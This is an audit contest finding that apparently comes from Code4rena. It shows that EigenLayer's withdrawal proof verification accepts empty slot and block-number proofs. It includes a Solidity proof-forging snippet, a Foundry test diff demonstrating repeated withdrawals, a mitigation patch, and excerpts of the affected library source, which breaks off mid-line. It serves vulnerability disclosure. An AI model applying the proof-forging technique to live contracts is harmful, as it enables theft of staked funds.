{
  "Title": "[H-01] Slot and block number proofs not required for verification of withdrawal (multiple withdrawals possible)",
  "Content": "\nSince this is a vulnerability that involves multiple in-scope contracts and leads to more than one impact, let's start with a bug description from bottom to top.\n\n### Library `Merkle`\n\nThe methods [verifyInclusionSha256(proof, root, leaf, index)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/libraries/Merkle.sol#L80-L87) and [verifyInclusionKeccak(proof, root, leaf, index)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/libraries/Merkle.sol#L29-L36) will **always** return `true` if `proof.length < 32` (e.g. empty proof) **and** `leaf == root`. Although this might be intended behaviour, I see no use case for empty proofs and would `require` non-empty proofs at the library level. As of now, the user of the library is **responsible** to enforce non-zero proofs.\n\n### Library `BeaconChainProofs`\n\nThe method [verifyWithdrawalProofs(beaconStateRoot, proofs, withdrawalFields)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/libraries/BeaconChainProofs.sol#L245-L295), which relies on multiple calls to [Merkle.verifyInclusionSha256(proof, root, leaf, index)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/libraries/Merkle.sol#L80-L87), does not `require` a minimum length of `proofs.slotProof` and `proofs.blockNumberProof`. As a consequence, considering a valid set of `(beaconStateRoot, proofs, withdrawalFields)`, the method will still succeed with **empty** slot and block number proofs, i.e. the `proofs` can be modified in the following way:\n\n```solidity\nproofs.slotProof = bytes(\"\");             // empty slot proof\nproofs.slotRoot = proofs.blockHeaderRoot; // make leaf == root\n\nproofs.blockNumberProof = bytes(\"\");                  // empty block number proof\nproofs.blockNumberRoot = proofs.executionPayloadRoot; // make leaf == root\n```\n\nAs a consequence, we can take a perfectly valid withdrawal proof and re-create the proof for the same withdrawal with a **different** slot and block number (according to the code above) that will still be accepted by the [verifyWithdrawalProofs(beaconStateRoot, proofs, withdrawalFields)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/libraries/BeaconChainProofs.sol#L245-L295) method.\n\n### Contract `EigenPod`\n\nThe method [verifyAndProcessWithdrawal(withdrawalProofs, ...)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/pods/EigenPod.sol#L305-L359), which relies on a call to [BeaconChainProofs.verifyWithdrawalProofs(beaconStateRoot, proofs, withdrawalFields)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/libraries/BeaconChainProofs.sol#L245-L295), is impacted by a modified - but still valid - withdrawal proof in two ways.\n\n**First**, the modifier [proofIsForValidBlockNumber(Endian.fromLittleEndianUint64(withdrawalProofs.blockNumberRoot))](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/pods/EigenPod.sol#L325) makes sure that the **block number** being proven is greater/newer than the `mostRecentWithdrawalBlockNumber`. In our case, `blockNumberRoot = executionPayloadRoot` and depending on the actual value of `executionPayloadRoot`, the `proofIsForValidBlockNumber` can be bypassed as shown in the test, see any PoC test case. As a consequence, old withdrawal proofs could be re-used with an empty `blockNumberProof` to withdraw the same funds more than once.\n\n**Second**, the sub-method [\\_processPartialWithdrawal(withdrawalHappenedSlot, ...)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/pods/EigenPod.sol#L422-L430) requires that a **slot** is only used once. In our case, `slotRoot = blockHeaderRoot`  leads to a [different slot](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/pods/EigenPod.sol#L347) than suggested by the original proof. Therefore, a withdrawal proof can be re-used with an empty `slotProof` to do the same partial withdrawal twice, see PoC. Depending on the actual value of `blockHeaderRoot`, a full withdrawal, instead of a partial withdrawal, will be done according to the [condition in L354](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/pods/EigenPod.sol#L354).\n\nInsufficient validation of proofs allows multiple withdrawals, i.e. theft of funds.\n\n### Proof of Concept\n\nThe changes to the `EigenPod` test cases below demonstrate the following outcomes:<br>\n**testFullWithdrawalProof:** [BeaconChainProofs.verifyWithdrawalProofs(beaconStateRoot, proofs, withdrawalFields)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/libraries/BeaconChainProofs.sol#L245-L295) still succeeds on empty slot and block number proofs.<br>\n**testFullWithdrawalFlow:** [EigenPod.verifyAndProcessWithdrawal(withdrawalProofs, ...)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/pods/EigenPod.sol#L305-L359) allows full withdrawal with empty slot and block number proofs.<br>\n**testPartialWithdrawalFlow:** [EigenPod.verifyAndProcessWithdrawal(withdrawalProofs, ...)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/pods/EigenPod.sol#L305-L359) allows partial withdrawal with empty slot and block number proofs.<br>\n**testProvingMultipleWithdrawalsForSameSlot:** [EigenPod.verifyAndProcessWithdrawal(withdrawalProofs, ...)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/pods/EigenPod.sol#L305-L359) allows partial withdrawal of the same funds twice due to different `slotRoot` in original and modified proof.<br>\n\nThe [proofIsForValidBlockNumber(Endian.fromLittleEndianUint64(withdrawalProofs.blockNumberRoot))](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/pods/EigenPod.sol#L325) modifier is bypassed (see `blockNumberRoot`) in the latter three of the above test cases.\n\nApply the following *diff* to your `src/test/EigenPod.t.sol` and run the tests with `forge test --match-contract EigenPod`:\n\n```diff\ndiff --git a/src/test/EigenPod.t.sol b/src/test/EigenPod.t.sol\nindex 31e6a58..5242def 100644\n--- a/src/test/EigenPod.t.sol\n+++ b/src/test/EigenPod.t.sol\n@@ -260,7 +260,7 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {\n\n     function testFullWithdrawalProof() public {\n         setJSON(\"./src/test/test-data/fullWithdrawalProof.json\");\n-        BeaconChainProofs.WithdrawalProofs memory proofs = _getWithdrawalProof();\n+        BeaconChainProofs.WithdrawalProofs memory proofs = _getWithdrawalProof(SKIP_SLOT_BLOCK_PROOF);\n         withdrawalFields = getWithdrawalFields();\n         validatorFields = getValidatorFields();\n\n@@ -281,7 +281,7 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {\n\n         // ./solidityProofGen \"WithdrawalFieldsProof\" 61336 2262 \"data/slot_43222/oracle_capella_beacon_state_43300.ssz\" \"data/slot_43222/capella_block_header_43222.json\" \"data/slot_43222/capella_block_43222.json\" fullWithdrawalProof.json\n         setJSON(\"./src/test/test-data/fullWithdrawalProof.json\");\n-        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof();\n+        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof(SKIP_SLOT_BLOCK_PROOF);\n         bytes memory validatorFieldsProof = abi.encodePacked(getValidatorProof());\n         withdrawalFields = getWithdrawalFields();\n         validatorFields = getValidatorFields();\n@@ -317,7 +317,7 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {\n         //generate partialWithdrawalProofs.json with:\n         // ./solidityProofGen \"WithdrawalFieldsProof\" 61068 656 \"data/slot_58000/oracle_capella_beacon_state_58100.ssz\" \"data/slot_58000/capella_block_header_58000.json\" \"data/slot_58000/capella_block_58000.json\" \"partialWithdrawalProof.json\"\n         setJSON(\"./src/test/test-data/partialWithdrawalProof.json\");\n-        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof();\n+        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof(SKIP_SLOT_BLOCK_PROOF);\n         bytes memory validatorFieldsProof = abi.encodePacked(getValidatorProof());\n\n         withdrawalFields = getWithdrawalFields();\n@@ -346,21 +346,22 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {\n\n     /// @notice verifies that multiple partial withdrawals can be made before a full withdrawal\n     function testProvingMultipleWithdrawalsForSameSlot(/*uint256 numPartialWithdrawals*/) public {\n-        IEigenPod newPod = testPartialWithdrawalFlow();\n+        IEigenPod newPod = testPartialWithdrawalFlow(); // uses SKIP_SLOT_BLOCK_PROOF\n\n-        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof();\n+        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof(FULL_PROOF);\n         bytes memory validatorFieldsProof = abi.encodePacked(getValidatorProof());\n         withdrawalFields = getWithdrawalFields();\n         validatorFields = getValidatorFields();\n\n-        cheats.expectRevert(bytes(\"EigenPod._processPartialWithdrawal: partial withdrawal has already been proven for this slot\"));\n+        // do not expect revert anymore due to different 'slotRoot' on FULL_PROOF and SKIP_SLOT_BLOCK_PROOF\n+        //cheats.expectRevert(bytes(\"EigenPod._processPartialWithdrawal: partial withdrawal has already been proven for this slot\"));\n         newPod.verifyAndProcessWithdrawal(withdrawalProofs, validatorFieldsProof, validatorFields, withdrawalFields, 0, 0);\n     }\n\n     /// @notice verifies that multiple full withdrawals for a single validator fail\n     function testDoubleFullWithdrawal() public {\n-        IEigenPod newPod = testFullWithdrawalFlow();\n-        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof();\n+        IEigenPod newPod = testFullWithdrawalFlow(); // uses SKIP_SLOT_BLOCK_PROOF\n+        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof(FULL_PROOF);\n         bytes memory validatorFieldsProof = abi.encodePacked(getValidatorProof());\n         withdrawalFields = getWithdrawalFields();\n         validatorFields = getValidatorFields();\n@@ -759,8 +760,11 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {\n         return proofs;\n     }\n\n+    uint256 internal constant FULL_PROOF = 0;\n+    uint256 internal constant SKIP_SLOT_BLOCK_PROOF = 1;\n+\n     /// @notice this function just generates a valid proof so that we can test other functionalities of the withdrawal flow\n-    function _getWithdrawalProof() internal returns(BeaconChainProofs.WithdrawalProofs memory) {\n+    function _getWithdrawalProof(uint256 proofType) internal returns(BeaconChainProofs.WithdrawalProofs memory) {\n         //make initial deposit\n         cheats.startPrank(podOwner);\n         eigenPodManager.stake{value: stakeAmount}(pubkey, signature, depositDataRoot);\n@@ -773,9 +777,9 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {\n             beaconChainOracle.setBeaconChainStateRoot(beaconStateRoot);\n             bytes32 blockHeaderRoot = getBlockHeaderRoot();\n             bytes32 blockBodyRoot = getBlockBodyRoot();\n-            bytes32 slotRoot = getSlotRoot();\n-            bytes32 blockNumberRoot = getBlockNumberRoot();\n+            bytes32 slotRoot = (proofType == FULL_PROOF) ? getSlotRoot() : blockHeaderRoot; // else SKIP_SLOT_BLOCK_PROOF\n             bytes32 executionPayloadRoot = getExecutionPayloadRoot();\n+            bytes32 blockNumberRoot = (proofType == FULL_PROOF) ? getBlockNumberRoot() :  executionPayloadRoot; // else SKIP_SLOT_BLOCK_PROOF\n\n\n\n@@ -786,9 +790,9 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {\n             BeaconChainProofs.WithdrawalProofs memory proofs = BeaconChainProofs.WithdrawalProofs(\n                 abi.encodePacked(getBlockHeaderProof()),\n                 abi.encodePacked(getWithdrawalProof()),\n-                abi.encodePacked(getSlotProof()),\n+                (proofType == FULL_PROOF) ? abi.encodePacked(getSlotProof()) : bytes(\"\"), // else SKIP_SLOT_BLOCK_PROOF\n                 abi.encodePacked(getExecutionPayloadProof()),\n-                abi.encodePacked(getBlockNumberProof()),\n+                (proofType == FULL_PROOF) ? abi.encodePacked(getBlockNumberProof()) : bytes(\"\"), // else SKIP_SLOT_BLOCK_PROOF\n                 uint64(blockHeaderRootIndex),\n                 uint64(withdrawalIndex),\n                 blockHeaderRoot,\n\n```\n\nWe can see that **all** the test cases are still passing, whereby the following ones are confirming the aforementioned outcomes:\n\n    [PASS] testFullWithdrawalFlow():(address) (gas: 28517915)\n    [PASS] testFullWithdrawalProof() (gas: 13185538)\n    [PASS] testPartialWithdrawalFlow():(address) (gas: 28679149)\n    [PASS] testProvingMultipleWithdrawalsForSameSlot() (gas: 45502286)\n\n### Tools Used\n\nVS Code, Foundry\n\n### Recommended Mitigation Steps\n\nRequire a minimum length (tree height) for the slot and block number proofs in [BeaconChainProofs.verifyWithdrawalProofs(beaconStateRoot, proofs, withdrawalFields)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/libraries/BeaconChainProofs.sol#L245-L295).\n\nAt least require non-empty proofs according to the following *diff*:\n\n```diff\ndiff --git a/src/contracts/libraries/BeaconChainProofs.sol b/src/contracts/libraries/BeaconChainProofs.sol\nindex b4129bf..119baf2 100644\n--- a/src/contracts/libraries/BeaconChainProofs.sol\n+++ b/src/contracts/libraries/BeaconChainProofs.sol\n@@ -259,6 +259,10 @@ library BeaconChainProofs {\n             \"BeaconChainProofs.verifyWithdrawalProofs: withdrawalProof has incorrect length\");\n         require(proofs.executionPayloadProof.length == 32 * (BEACON_BLOCK_HEADER_FIELD_TREE_HEIGHT + BEACON_BLOCK_BODY_FIELD_TREE_HEIGHT),\n             \"BeaconChainProofs.verifyWithdrawalProofs: executionPayloadProof has incorrect length\");\n+        require(proofs.slotProof.length >= 32,\n+            \"BeaconChainProofs.verifyWithdrawalProofs: slotProof has incorrect length\");\n+        require(proofs.blockNumberProof.length >= 32,\n+            \"BeaconChainProofs.verifyWithdrawalProofs: blockNumberProof has incorrect length\");\n\n         /**\n          * Computes the block_header_index relative to the beaconStateRoot.  It concatenates the indexes of all the\n\n```\n\n**Alternative**: Non-empty proofs can also be required in the `Merkle` library.\n\n### Assessed type\n\nInvalid Validation\n\n**[sorrynotsorry (lookout) commented](https://github.com/code-423n4/2023-04-eigenlayer-findings/issues/388#issuecomment-1538229800):**\n > Well demonstrated with referrable code snippets, hyperlinks, and coded POC.\n> Marking as HQ.\n\n**[Sidu28 (EigenLayer) confirmed](https://github.com/code-423n4/2023-04-eigenlayer-findings/issues/388#issuecomment-1544934936)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-04-eigenlayer-findings/issues/388#issuecomment-1572241854):**\n > The Warden has shown how, due to a lack of length check, an empty proof could be provided; which would pass validation.\n> \n> This is an example of how a lack of a check can be chained into a proper exploit, and because the proof will pass, funds can be stolen.\n> \n> For these reasons I agree with High Severity.\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2023-04-eigenlayer",
  "Code": [
    {
      "filename": "src/contracts/libraries/Merkle.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\n// Adapted from OpenZeppelin Contracts (last updated v4.8.0) (utils/cryptography/MerkleProof.sol)\n\npragma solidity =0.8.12;\n\n/**\n * @dev These functions deal with verification of Merkle Tree proofs.\n *\n * The tree and the proofs can be generated using our\n * https://github.com/OpenZeppelin/merkle-tree[JavaScript library].\n * You will find a quickstart guide in the readme.\n *\n * WARNING: You should avoid using leaf values that are 64 bytes long prior to\n * hashing, or use a hash function other than keccak256 for hashing leaves.\n * This is because the concatenation of a sorted pair of internal nodes in\n * the merkle tree could be reinterpreted as a leaf value.\n * OpenZeppelin's JavaScript library generates merkle trees that are safe\n * against this attack out of the box.\n */\nlibrary Merkle {\n    /**\n     * @dev Returns the rebuilt hash obtained by traversing a Merkle tree up\n     * from `leaf` using `proof`. A `proof` is valid if and only if the rebuilt\n     * hash matches the root of the tree. The tree is built assuming `leaf` is \n     * the 0 indexed `index`'th leaf from the bottom left of the tree.\n     * \n     * Note this is for a Merkle tree using the keccak/sha3 hash function\n     */\n    function verifyInclusionKeccak(\n        bytes memory proof,\n        bytes32 root,\n        bytes32 leaf,\n        uint256 index\n    ) internal pure returns (bool) {\n        return processInclusionProofKeccak(proof, leaf, index) == root;\n    }\n\n    /**\n     * @dev Returns the rebuilt hash obtained by traversing a Merkle tree up\n     * from `leaf` using `proof`. A `proof` is valid if and only if the rebuilt\n     * hash matches the root of the tree. The tree is built assuming `leaf` is \n     * the 0 indexed `index`'th leaf from the bottom left of the tree.\n     * \n     * _Available since v4.4._\n     * \n     * Note this is for a Merkle tree using the keccak/sha3 hash function\n     */\n    function processInclusionProofKeccak(bytes memory proof, bytes32 leaf, uint256 index) internal pure returns (bytes32) {\n        bytes32 computedHash = leaf;\n        for (uint256 i = 32; i <= proof.length; i+=32) {\n            if(index % 2 == 0) {\n                // if ith bit of index is 0, then computedHash is a left sibling\n                assembly {\n                    mstore(0x00, computedHash)\n                    mstore(0x20, mload(add(proof, i)))\n                    computedHash := keccak256(0x00, 0x40)\n                    index := div(index, 2)\n                }\n            } else {\n                // if ith bit of index is 1, then computedHash is a right sibling\n                assembly {\n                    mstore(0x00, mload(add(proof, i)))\n                    mstore(0x20, computedHash)\n                    computedHash := keccak256(0x00, 0x40)\n                    index := div(index, 2)\n                }            \n            }\n        }\n        return computedHash;\n    }\n\n    /**\n     * @dev Returns the rebuilt hash obtained by traversing a Merkle tree up\n     * from `leaf` using `proof`. A `proof` is valid if and only if the rebuilt\n     * hash matches the root of the tree. The tree is built assuming `leaf` is \n     * the 0 indexed `index`'th leaf from the bottom left of the tree.\n     * \n     * Note this is for a Merkle tree using the sha256 hash function\n     */\n    function verifyInclusionSha256(\n        bytes memory proof,\n        bytes32 root,\n        bytes32 leaf,\n        uint256 index\n    ) internal view returns (bool) {\n        return processInclusionProofSha256(proof, leaf, index) == root;\n    }\n\n    /**\n     * @dev Returns the rebuilt hash obtained by traversing a Merkle tree up\n     * from `leaf` using `proof`. A `proof` is valid if and only if the rebuilt\n     * hash matches the root of the tree. The tree is built assuming `leaf` is \n     * the 0 indexed `index`'th leaf from the bottom left of the tree.\n     *\n     * _Available since v4.4._\n     * \n     * Note this is for a Merkle tree using the sha256 hash function\n     */\n    function processInclusionProofSha256(bytes memory proof, bytes32 leaf, uint256 index) internal view returns (bytes32) {\n        bytes32[1] memory computedHash = [leaf];\n        for (uint256 i = 32; i <= proof.length; i+=32) {\n            if(index % 2 == 0) {\n                // if ith bit of index is 0, then computedHash is a left sibling\n                assembly {\n                    mstore(0x00, mload(computedHash))\n                    mstore(0x20, mload(add(proof, i)))\n                    if iszero(staticcall(sub(gas(), 2000), 2, 0x00, 0x40, computedHash, 0x20)) {revert(0, 0)}\n                    index := div(index, 2)\n                }\n            } else {\n                // if ith bit of index is 1, then computedHash is a right sibling\n                assembly {\n                    mstore(0x00, mload(add(proof, i)))\n                    mstore(0x20, mload(computedHash))\n                    if iszero(staticcall(sub(gas(), 2000), 2, 0x00, 0x40, computedHash, 0x20)) {revert(0, 0)}\n                    index := div(index, 2)\n                }            \n            }\n        }\n        return computedHash[0];\n    }\n\n    /**\n     @notice this function returns the merkle root of a tree created from a set of leaves using sha256 as its hash function\n     @param leaves the leaves of the merkle tree\n\n     @notice requires the leaves.length is a power of 2\n     */ \n    function merkleizeSha256(\n        bytes32[] memory leaves\n    ) internal pure returns (bytes32) {\n        //there are half as many nodes in the layer above the leaves\n        uint256 numNodesInLayer = leaves.length / 2;\n        //create a layer to store the internal nodes\n        bytes32[] memory layer = new bytes32[](numNodesInLayer);\n        //fill the layer with the pairwise hashes of the leaves\n        for (uint i = 0; i < numNodesInLayer; i++) {\n            layer[i] = sha256(abi.encodePacked(leaves[2*i], leaves[2*i+1]));\n        }\n        //the next layer above has half as many nodes\n        numNodesInLayer /= 2;\n        //while we haven't computed the root\n        while (numNodesInLayer != 0) {\n            //overwrite the first numNodesInLayer nodes in layer with the pairwise hashes of their children\n            for (uint i = 0; i < numNodesInLayer; i++) {\n                layer[i] = sha256(abi.encodePacked(layer[2*i], layer[2*i+1]));\n            }\n            //the next layer above has half as many nodes\n            numNodesInLayer /= 2;\n        }\n        //the first node in the layer is the root\n        return layer[0];\n    }\n}"
    },
    {
      "filename": "src/contracts/libraries/BeaconChainProofs.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\n\npragma solidity =0.8.12;\n\nimport \"./Merkle.sol\";\nimport \"../libraries/Endian.sol\";\n\n//Utility library for parsing and PHASE0 beacon chain block headers\n//SSZ Spec: https://github.com/ethereum/consensus-specs/blob/dev/ssz/simple-serialize.md#merkleization\n//BeaconBlockHeader Spec: https://github.com/ethereum/consensus-specs/blob/dev/specs/phase0/beacon-chain.md#beaconblockheader\n//BeaconState Spec: https://github.com/ethereum/consensus-specs/blob/dev/specs/phase0/beacon-chain.md#beaconstate\nlibrary BeaconChainProofs {\n    // constants are the number of fields and the heights of the different merkle trees used in merkleizing beacon chain containers\n    uint256 internal constant NUM_BEACON_BLOCK_HEADER_FIELDS = 5;\n    uint256 internal constant BEACON_BLOCK_HEADER_FIELD_TREE_HEIGHT = 3;\n\n    uint256 internal constant NUM_BEACON_BLOCK_BODY_FIELDS = 11;\n    uint256 internal constant BEACON_BLOCK_BODY_FIELD_TREE_HEIGHT = 4;\n\n    uint256 internal constant NUM_BEACON_STATE_FIELDS = 21;\n    uint256 internal constant BEACON_STATE_FIELD_TREE_HEIGHT = 5;\n\n    uint256 internal constant NUM_ETH1_DATA_FIELDS = 3;\n    uint256 internal constant ETH1_DATA_FIELD_TREE_HEIGHT = 2;\n\n    uint256 internal constant NUM_VALIDATOR_FIELDS = 8;\n    uint256 internal constant VALIDATOR_FIELD_TREE_HEIGHT = 3;\n\n    uint256 internal constant NUM_EXECUTION_PAYLOAD_HEADER_FIELDS = 15;\n    uint256 internal constant EXECUTION_PAYLOAD_HEADER_FIELD_TREE_HEIGHT = 4;\n\n\n    uint256 internal constant NUM_EXECUTION_PAYLOAD_FIELDS = 15;\n    uint256 internal constant EXECUTION_PAYLOAD_FIELD_TREE_HEIGHT = 4;\n\n\n    // HISTORICAL_ROOTS_LIMIT\t = 2**24, so tree height is 24\n    uint256 internal constant HISTORICAL_ROOTS_TREE_HEIGHT = 24;\n\n    // HISTORICAL_BATCH is root of state_roots and block_root, so number of leaves =  2^1\n    uint256 internal constant HISTORICAL_BATCH_TREE_HEIGHT = 1;\n\n    // SLOTS_PER_HISTORICAL_ROOT = 2**13, so tree height is 13\n    uint256 internal constant STATE_ROOTS_TREE_HEIGHT = 13;\n    uint256 internal constant BLOCK_ROOTS_TREE_HEIGHT = 13;\n\n\n    uint256 internal constant NUM_WITHDRAWAL_FIELDS = 4;\n    // tree height for hash tree of an individual withdrawal container\n    uint256 internal constant WITHDRAWAL_FIELD_TREE_HEIGHT = 2;\n\n    uint256 internal constant VALIDATOR_TREE_HEIGHT = 40;\n    //refer to the eigenlayer-cli proof library.  Despite being the same dimensions as the validator tree, the balance tree is merkleized differently\n    uint256 internal constant BALANCE_TREE_HEIGHT = 38;\n\n    // MAX_WITHDRAWALS_PER_PAYLOAD = 2**4, making tree height = 4\n    uint256 internal constant WITHDRAWALS_TREE_HEIGHT = 4;\n\n    //in beacon block body\n    uint256 internal constant EXECUTION_PAYLOAD_INDEX = 9;\n\n    // in beacon block header\n    uint256 internal constant STATE_ROOT_INDEX = 3;\n    uint256 internal constant PROPOSER_INDEX_INDEX = 1;\n    uint256 internal constant SLOT_INDEX = 0;\n    uint256 internal constant BODY_ROOT_INDEX = 4;\n    // in beacon state\n    uint256 internal constant STATE_ROOTS_INDEX = 6;\n    uint256 internal constant BLOCK_ROOTS_INDEX = 5;\n    uint256 internal constant HISTORICAL_ROOTS_INDEX = 7;\n    uint256 internal constant ETH_1_ROOT_INDEX = 8;\n    uint256 internal constant VALIDATOR_TREE_ROOT_INDEX = 11;\n    uint256 internal constant BALANCE_INDEX = 12;\n    uint256 internal constant EXECUTION_PAYLOAD_HEADER_INDEX = 24;\n    uint256 internal constant HISTORICAL_BATCH_STATE_ROOT_INDEX = 1;\n\n    // in validator\n    uint256 internal constant VALIDATOR_WITHDRAWAL_CREDENTIALS_INDEX = 1;\n    uint256 internal constant VALIDATOR_BALANCE_INDEX = 2;\n    uint256 internal constant VALIDATOR_SLASHED_INDEX = 3;\n    uint256 internal constant VALIDATOR_WITHDRAWABLE_EPOCH_INDEX = 7;\n    \n    // in exection payload header\n    uint256 internal constant BLOCK_NUMBER_INDEX = 6;\n    uint256 internal constant WITHDRAWALS_ROOT_INDEX = 14;\n\n    //in execution payload\n    uint256 internal constant WITHDRAWALS_INDEX = 14;\n\n    // in withdrawal\n    uint256 internal constant WITHDRAWAL_VALIDATOR_INDEX_INDEX = 1;\n    uint256 internal constant WITHDRAWAL_VALIDATOR_AMOUNT_INDEX = 3;\n\n    //In historicalBatch\n    uint256 internal constant HISTORICALBATCH_STATEROOTS_INDEX = 1;\n\n    //Misc Constants\n    uint256 internal constant SLOTS_PER_EPOCH = 32;\n\n    bytes8 internal constant UINT64_MASK = 0xffffffffffffffff;\n\n\n\n    struct WithdrawalProofs {\n        bytes blockHeaderProof;\n        bytes withdrawalProof;\n        bytes slotProof;\n        bytes executionPayloadProof;\n        bytes blockNumberProof;\n        uint64 blockHeaderRootIndex;\n        uint64 withdrawalIndex;\n        bytes32 blockHeaderRoot;\n        bytes32 blockBodyRoot;\n        bytes32 slotRoot;\n        bytes32 blockNumberRoot;\n        bytes32 executionPayloadRoot;\n    }\n\n    struct ValidatorFieldsAndBalanceProofs {\n        bytes validatorFieldsProof;\n        bytes validatorBalanceProof;\n        bytes32 balanceRoot;\n    }\n\n    struct ValidatorFieldsProof {\n        bytes validatorProof;\n        uint40 validatorIndex;\n    }\n\n    function computePhase0BeaconBlockHeaderRoot(bytes32[NUM_BEACON_BLOCK_HEADER_FIELDS] calldata blockHeaderFields) internal pure returns(bytes32) {\n        bytes32[] memory paddedHeaderFields = new bytes32[](2**BEACON_BLOCK_HEADER_FIELD_TREE_HEIGHT);\n        \n        for (uint256 i = 0; i < NUM_BEACON_BLOCK_HEADER_FIELDS; ++i) {\n            paddedHeaderFields[i] = blockHeaderFields[i];\n        }\n\n        return Merkle.merkleizeSha256(paddedHeaderFields);\n    }\n\n    function computePhase0BeaconStateRoot(bytes32[NUM_BEACON_STATE_FIELDS] calldata beaconStateFields) internal pure returns(bytes32) {\n        bytes32[] memory paddedBeaconStateFields = new bytes32[](2**BEACON_STATE_FIELD_TREE_HEIGHT);\n        \n        for (uint256 i = 0; i < NUM_BEACON_STATE_FIELDS; ++i) {\n            paddedBeaconStateFields[i] = beaconStateFields[i];\n        }\n        \n        return Merkle.merkleizeSha256(paddedBeaconStateFields);\n    }\n\n    function computePhase0ValidatorRoot(bytes32[NUM_VALIDATOR_FIELDS] calldata validatorFields) internal pure returns(bytes32) {  \n        bytes32[] memory paddedValidatorFields = new bytes32[](2**VALIDATOR_FIELD_TREE_HEIGHT);\n        \n        for (uint256 i = 0; i < NUM_VALIDATOR_FIELDS; ++i) {\n            paddedValidatorFields[i] = validatorFields[i];\n        }\n\n        return Merkle.merkleizeSha256(paddedValidatorFields);\n    }\n\n    function computePhase0Eth1DataRoot(bytes32[NUM_ETH1_DATA_FIELDS] calldata eth1DataFields) internal pure returns(bytes32) {  \n        bytes32[] memory paddedEth1DataFields = new bytes32[](2**ETH1_DATA_FIELD_TREE_HEIGHT);\n        \n        for (uint256 i = 0; i < ETH1_DATA_FIELD_TREE_HEIGHT; ++i) {\n            paddedEth1DataFields[i] = eth1DataFields[i];\n        }\n\n        return Merkle.merkleizeSha256(paddedEth1DataFields);\n    }\n\n    /**\n     * \n     * @notice This function is parses the balanceRoot to get the uint64 balance of a validator.  During merkleization of the\n     * beacon state balance tree, four uint64 values (making 32 bytes) are grouped together and treated as a single leaf in the merkle tree. Thus the\n     * validatorIndex mod 4 is used to determine which of the four uint64 values to extract from the balanceRoot.\n     * @param validatorIndex is the index of the validator being proven for.\n     * @param balanceRoot is the combination of 4 validator balances being proven for.\n     */\n   function getBalanceFromBalanceRoot(uint40 validatorIndex, bytes32 balanceRoot) internal pure returns (uint64) {\n        uint256 bitShiftAmount = (validatorIndex % 4) * 64;\n        bytes32 validatorBalanceLittleEndian = bytes32((uint256(balanceRoot) << bitShiftAmount));\n        uint64 validatorBalance = Endian.fromLittleEndianUint64(validatorBalanceLittleEndian);\n        return validatorBalance;\n    }\n\n    /**\n     * @notice This function verifies merkle proofs of the fields of a certain validator against a beacon chain state root\n     * @param validatorIndex the index of the proven validator\n     * @param beaconStateRoot is the beacon chain state root to be proven against.\n     * @param proof is the data used in proving the validator's fields\n     * @param validatorFields the claimed fields of the validator\n     */\n    function verifyValidatorFields(\n        uint40 validatorIndex,\n        bytes32 beaconStateRoot,\n        bytes calldata proof, \n        bytes32[] calldata validatorFields\n    ) internal view {\n        \n        require(validatorFields.length == 2**VALIDATOR_FIELD_TREE_HEIGHT, \"BeaconChainProofs.verifyValidatorFields: Validator fields has incorrect length\");\n\n        /**\n         * Note: the length of the validator merkle proof is BeaconChainProofs.VALIDATOR_TREE_HEIGHT + 1.\n         * There is an additional layer added by hashing the root with the length of the validator list\n         */\n        require(proof.length == 32 * ((VALIDATOR_TREE_HEIGHT + 1) + BEACON_STATE_FIELD_TREE_HEIGHT), \"BeaconChainProofs.verifyValidatorFields: Proof has incorrect length\");\n        uint256 index = (VALIDATOR_TREE_ROOT_INDEX << 